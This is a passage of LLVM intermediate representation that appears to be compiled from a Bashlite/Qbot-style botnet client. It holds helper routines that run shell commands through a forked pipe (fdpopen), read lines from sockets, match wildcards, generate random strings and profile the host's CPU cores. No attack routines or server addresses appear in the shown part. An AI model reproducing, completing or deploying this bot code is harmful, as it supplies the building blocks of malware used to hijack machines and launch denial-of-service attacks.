; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #4
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #4
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #4
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #4
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #4
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* %99, i8* null) #4
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #3

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %62

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #4
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #4
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #4
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #4
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #4
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #4
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %60

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, 65280
  %59 = ashr i32 %58, 8
  br label %60

; <label>:60:                                     ; preds = %53, %52
  %61 = phi i32 [ -1, %52 ], [ %59, %53 ]
  store i32 %61, i32* %2, align 4
  br label %62

; <label>:62:                                     ; preds = %60, %19
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #3

declare i32 @waitpid(i32, i32*, i32) #5

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %43

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #10
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #10
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #4
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

; <label>:52:                                     ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* %54) #10
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

; <label>:61:                                     ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

; <label>:63:                                     ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #10
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43

; <label>:69:                                     ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* %70, i32 46) #10
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

; <label>:73:                                     ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* %74, i32 46) #10
  store i8 0, i8* %75, align 1
  br label %76

; <label>:76:                                     ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* %77, i8* %78) #4
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %2, align 4
  br label %87

; <label>:82:                                     ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:84:                                     ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 %85)
  store i32 1, i32* %2, align 4
  br label %87

; <label>:87:                                     ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:21:                                     ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
